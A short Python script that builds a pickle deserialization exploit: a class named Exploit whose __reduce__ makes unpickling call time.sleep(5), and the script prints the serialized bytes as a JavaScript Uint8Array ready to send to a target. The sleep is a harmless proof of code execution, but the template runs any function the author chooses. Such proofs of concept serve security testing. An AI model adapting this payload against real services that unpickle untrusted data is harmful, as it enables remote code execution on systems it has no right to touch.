import pickle
import time

class Exploit:
    def __reduce__(self):
        import time
        return (time.sleep, (5,))  # sleep for 5 seconds

payload = pickle.dumps(Exploit())

# Convert to byte array (for JS or raw byte input)
hex_bytes = [f"0x{b:02x}" for b in payload]
print("Uint8Array.from([{}])".format(', '.join(hex_bytes)))
